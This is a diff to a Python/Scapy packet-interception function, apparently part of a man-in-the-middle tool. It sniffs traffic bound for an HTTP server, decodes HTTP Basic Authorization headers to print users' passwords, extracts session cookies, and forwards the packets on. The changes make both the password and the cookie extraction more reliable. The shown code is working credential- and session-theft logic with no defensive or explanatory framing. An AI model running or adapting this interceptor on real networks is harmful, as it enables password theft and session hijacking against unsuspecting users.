@@ -67,8 +67,9 @@ def interceptor(packet):
             if packet[IP].dst == httpServerIP:
                 if Raw in packet:
                     str = packet[Raw].load.decode("utf-8")
-                    start = str.find('Basic ') + 6
-                    end = str.find('=\r') + 1
+                    start = str.find('Authorization: ') + len('Authorization: ')
+                    end = str[start:].find('\r') + start
+                    start = str[start:].find(' ')+start+1
                     decoded = base64.b64decode(str[start:end]).decode("utf-8")
                     passIdx = decoded.find(':') + 1
                     print("*basicauth:"+decoded[passIdx:])
@@ -76,7 +77,8 @@ def interceptor(packet):
                 if Raw in packet:
                     str = packet[Raw].load.decode("utf-8")
                     start = str.find('session=')
-                    print("*cookie:"+str[start:start+24])
+                    end = str[start:].find('\r') + start
+                    print("*cookie:"+str[start:end])
             sendp(Ether()/packet[IP])
 
 
